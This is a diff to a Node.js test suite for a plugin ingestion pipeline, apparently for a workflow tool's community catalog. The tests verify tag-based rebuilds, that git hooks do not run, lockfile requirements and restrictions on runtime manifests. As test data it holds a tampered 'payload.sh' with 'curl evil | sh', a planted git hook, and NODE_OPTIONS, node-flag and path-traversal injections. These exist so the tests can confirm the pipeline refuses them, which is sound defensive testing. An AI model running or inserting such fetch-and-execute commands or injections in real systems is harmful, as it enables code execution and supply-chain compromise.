@@ -1,9 +1,10 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
+import { pathToFileURL } from "node:url";
 import { gunzipSync, gzipSync } from "node:zlib";
 import {
   CommunityPluginRejection, MAX_COMMUNITY_V2_ENTRY_BYTES, downloadHttpsBytes, ingestCommunityPlugin, ingestCommunityPlugins, parseMirrorSourceSha256,
@@ -12,7 +13,8 @@ import {
 import { COMMUNITY_FALLBACK_ICON_SVG, iconAssetNameFor } from "../lib/plugin-icons.mjs";
 import { buildCatalogEntry, listPluginNames, sha256Hex } from "../lib/plugin-package.mjs";
 import { listRepoDirectoryNames } from "../lib/community-plugins.mjs";
-import { createTarGz, isCanonicalTarGz, readTarGz, repackTarGz } from "../lib/tar-archive.mjs";
+import { createTarGz, isCanonicalTarGz, readTarGz, repackTarGz, toWritableEntries } from "../lib/tar-archive.mjs";
+import { findRebuildDifferences, rebuildCommunityPluginFromTag } from "../lib/community-rebuild.mjs";
 import { rawDirectory, rawFile, rawHeader, rawPaxHeader, rawTarGz } from "./fixtures/raw-tar.mjs";
 import { packExternalPlugin, writeCatalogFiles } from "../pack-plugins.mjs";
 import { REPO_ROOT } from "../plugins.mjs";
@@ -101,6 +103,8 @@ function createContext(tarballBytes, overrides = {}) {
       return tarballBytes;
     },
     log: (line) => logLines.push(line),
+    // Most tests build tarballs by hand; the rebuild tests below clone a real fixture repository instead.
+    rebuildFromTag: () => readTarGz(tarballBytes),
     ...overrides,
   };
   return { context, downloads, logLines, cleanUp: () => rmSync(workDirectory, { recursive: true, force: true }) };
@@ -312,36 +316,120 @@ test("a gzip bomb is refused by the unpacked size cap", async () => {
   assert.match(await ingestOrReason(bombBytes), /archive unpacks to more than/);
 });
 
-test("packs a plugin from its own git repository with scripts/pack-plugins.mjs --plugin-dir, ready to ingest", async () => {
+/**
+ * A community plugin's own git repository, committed and tagged v1.2.0, plus its tarball packed with
+ * scripts/pack-plugins.mjs --plugin-dir (what the author uploads).
+ */
+function createTaggedPluginRepository(extraFiles = {}, { packAuthorTarball = true } = {}) {
   const repositoryDirectory = mkdtempSync(join(tmpdir(), "community-repo-test-"));
   const outputDirectory = mkdtempSync(join(tmpdir(), "community-pack-test-"));
+  const manifest = { name: PLUGIN_NAME, version: "1.2.0", runtime: "process", command: "node", args: ["plugin.mjs"], nodes: [{ kind: "acme-crm.ping", title: "Ping", config_schema: { type: "object" } }] };
+  const files = { "graphrt-plugin.json": JSON.stringify(manifest), "plugin.mjs": PLUGIN_SOURCE, "icon.svg": VALID_ICON, "test/plugin.test.mjs": "", ...extraFiles };
+  for (const [relativePath, content] of Object.entries(files)) {
+    mkdirSync(join(repositoryDirectory, relativePath, ".."), { recursive: true });
+    writeFileSync(join(repositoryDirectory, relativePath), content);
+  }
+  writeFileSync(join(repositoryDirectory, ".env"), "ACME_API_KEY=never-shipped");
+  const identity = ["-c", "user.name=Fixture", "-c", "user.email=fixture@example.invalid", "-c", "commit.gpgsign=false", "-c", "tag.gpgsign=false"];
+  for (const gitArguments of [["init", "-q"], ["add", ...Object.keys(files)], [...identity, "commit", "-q", "-m", "release"], [...identity, "tag", "v1.2.0"]]) {
+    const gitResult = spawnSync("git", gitArguments, { cwd: repositoryDirectory, encoding: "utf8" });
+    assert.equal(gitResult.status, 0, gitResult.stderr);
+  }
+  const packed = packAuthorTarball ? packExternalPlugin(repositoryDirectory, outputDirectory) : null;
+  return {
+    repositoryDirectory,
+    packed,
+    tarballBytes: packed ? readFileSync(packed.tarballPath) : null,
+    rebuildFromTag: (pluginName, registryEntry) => rebuildCommunityPluginFromTag({ pluginName, cloneUrl: pathToFileURL(repositoryDirectory).href, tag: registryEntry.tag, workDirectory: outputDirectory }),
+    cleanUp: () => [repositoryDirectory, outputDirectory].forEach((directory) => rmSync(directory, { recursive: true, force: true })),
+  };
+}
+
+test("packs a plugin from its own git repository with --plugin-dir, rebuilds it from the tag and ingests it", async () => {
+  const fixture = createTaggedPluginRepository();
   try {
-    const manifest = { name: PLUGIN_NAME, version: "1.2.0", runtime: "process", command: "node", args: ["plugin.mjs"], nodes: [{ kind: "acme-crm.ping", title: "Ping", config_schema: { type: "object" } }] };
-    writeFileSync(join(repositoryDirectory, "graphrt-plugin.json"), JSON.stringify(manifest));
-    writeFileSync(join(repositoryDirectory, "plugin.mjs"), PLUGIN_SOURCE);
-    writeFileSync(join(repositoryDirectory, "icon.svg"), VALID_ICON);
-    writeFileSync(join(repositoryDirectory, ".env"), "ACME_API_KEY=never-shipped");
-    mkdirSync(join(repositoryDirectory, "test"));
-    writeFileSync(join(repositoryDirectory, "test", "plugin.test.mjs"), "");
-    for (const gitArguments of [["init", "-q"], ["add", "graphrt-plugin.json", "plugin.mjs", "icon.svg", "test"]]) {
-      assert.equal(spawnSync("git", gitArguments, { cwd: repositoryDirectory }).status, 0);
-    }
-    const packed = packExternalPlugin(repositoryDirectory, outputDirectory);
-    assert.equal(packed.tarballName, "acme-crm-1.2.0.tar.gz");
-    const tarballBytes = readFileSync(packed.tarballPath);
-    const { context, cleanUp } = createContext(tarballBytes);
+    assert.equal(fixture.packed.tarballName, "acme-crm-1.2.0.tar.gz");
+    const { context, cleanUp } = createContext(fixture.tarballBytes, { rebuildFromTag: fixture.rebuildFromTag });
     try {
-      const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(tarballBytes), context);
+      const ingested = await ingestCommunityPlugin(PLUGIN_NAME, registryEntryFor(fixture.tarballBytes), context);
       assert.equal(ingested.icon.bytes.toString("utf8"), VALID_ICON, "the packed icon.svg is used");
       assert.equal(ingested.catalogEntry.operations_count, 1);
+      assert.equal(ingested.sha256, sha256Hex(repackTarGz(fixture.tarballBytes)));
+      assert.ok(!readTarGz(fixture.tarballBytes).some((entry) => entry.path.endsWith(".env")), "untracked files never ship");
     } finally {
       cleanUp();
     }
   } finally {
-    rmSync(repositoryDirectory, { recursive: true, force: true });
-    rmSync(outputDirectory, { recursive: true, force: true });
+    fixture.cleanUp();
   }
 });
+
+test("skips a tarball that differs from the rebuild of its tag, with a diff summary", async () => {
+  const fixture = createTaggedPluginRepository();
+  try {
+    const authorEntries = readTarGz(fixture.tarballBytes);
+    const tampered = authorEntries.map((entry) => (entry.path === `${PLUGIN_NAME}/README.md` ? { ...entry, content: Buffer.from("changed") } : entry));
+    tampered.push({ path: `${PLUGIN_NAME}/payload.sh`, type: "file", content: Buffer.from("curl evil | sh\n"), mode: 0o755 });
+    tampered.push({ path: `${PLUGIN_NAME}/README.md`, type: "file", content: Buffer.from("not at the tag\n"), mode: 0o644 });
+    const tamperedBytes = createTarGz(toWritableEntries(tampered.filter((entry, index, all) => all.findIndex((other) => other.path === entry.path) === index)), { mtimeSeconds: 0 });
+    const reason = await ingestOrReason(tamperedBytes, {}, { rebuildFromTag: fixture.rebuildFromTag });
+    assert.match(reason, /does not match a rebuild from tag v1.2.0 \(\d+ differences\): .*only in the tarball: acme-crm\/payload.sh/);
+    assert.match(reason, /only in the tarball: acme-crm\/README.md/);
+  } finally {
+    fixture.cleanUp();
+  }
+});
+
+test("the rebuild clone runs no git hooks from the maintainer's configuration", () => {
+  const fixture = createTaggedPluginRepository();
+  const hooksDirectory = mkdtempSync(join(tmpdir(), "community-hooks-test-"));
+  const markerPath = join(hooksDirectory, "HOOK-RAN");
+  const globalConfigPath = join(hooksDirectory, "gitconfig");
+  writeFileSync(join(hooksDirectory, "post-checkout"), `#!/bin/sh\ntouch '${markerPath}'\n`, { mode: 0o755 });
+  writeFileSync(globalConfigPath, `[core]\n\thooksPath = ${hooksDirectory}\n`);
+  const originalGlobalConfig = process.env.GIT_CONFIG_GLOBAL;
+  process.env.GIT_CONFIG_GLOBAL = globalConfigPath;
+  try {
+    const rebuiltEntries = fixture.rebuildFromTag(PLUGIN_NAME, { tag: "v1.2.0" });
+    assert.deepEqual(findRebuildDifferences(readTarGz(fixture.tarballBytes), rebuiltEntries), []);
+    assert.equal(existsSync(markerPath), false, "post-checkout must not run");
+  } finally {
+    if (originalGlobalConfig === undefined) delete process.env.GIT_CONFIG_GLOBAL;
+    else process.env.GIT_CONFIG_GLOBAL = originalGlobalConfig;
+    rmSync(hooksDirectory, { recursive: true, force: true });
+    fixture.cleanUp();
+  }
+});
+
+test("a rebuild needs a lockfile when the plugin has dependencies", () => {
+  const lockless = createTaggedPluginRepository({ "package.json": JSON.stringify({ name: PLUGIN_NAME, dependencies: { "left-pad": "1.3.0" } }) }, { packAuthorTarball: false });
+  try {
+    assert.throws(() => lockless.rebuildFromTag(PLUGIN_NAME, { tag: "v1.2.0" }), /dependencies need a package-lock.json/);
+  } finally {
+    lockless.cleanUp();
+  }
+});
+
+test("only node with one pinned entrypoint is accepted as a community runtime", async () => {
+  const refusals = [
+    [{ command: "bash" }, /command must be "node"/],
+    [{ runtime: "wasm" }, /runtime must be "process"/],
+    [{ args: ["--require", "plugin.mjs"] }, /args must be exactly one entrypoint/],
+    [{ args: ["--import=evil.mjs"] }, /must be a file, not a node flag|not pinned/],
+    [{ args: ["../outside.mjs"] }, /must be a relative path inside the plugin/],
+    [{ args: ["README.md"] }, /must be a \.mjs, \.js or \.cjs file/],
+    [{ args: ["lib/unpinned.mjs"] }, /is not pinned in checksums/],
+    [{ env: { NODE_OPTIONS: "--require /tmp/x.js" } }, /process `env` is not allowed/],
+    [{ inherit_env: true }, /`inherit_env` is not allowed/],
+    [{ cwd: "/" }, /`cwd` is not allowed/],
+    [{ allow_unprefixed_kinds: true }, /`allow_unprefixed_kinds` is not allowed/],
+  ];
+  for (const [manifestOverrides, expectedReason] of refusals) {
+    assert.match(await ingestOrReason(buildFixtureTarball({ manifestOverrides })), expectedReason, JSON.stringify(manifestOverrides));
+  }
+  assert.equal(await ingestOrReason(buildFixtureTarball({ manifestOverrides: { env: {} } })), null);
+});
+
 
 test("refuses code that the manifest checksums do not pin, or pin wrongly", async () => {
   const unpinned = buildFixtureTarball({ extraFiles: [{ path: "lib/helper.mjs", content: Buffer.from("export {};\n") }], pinExtraFiles: false });
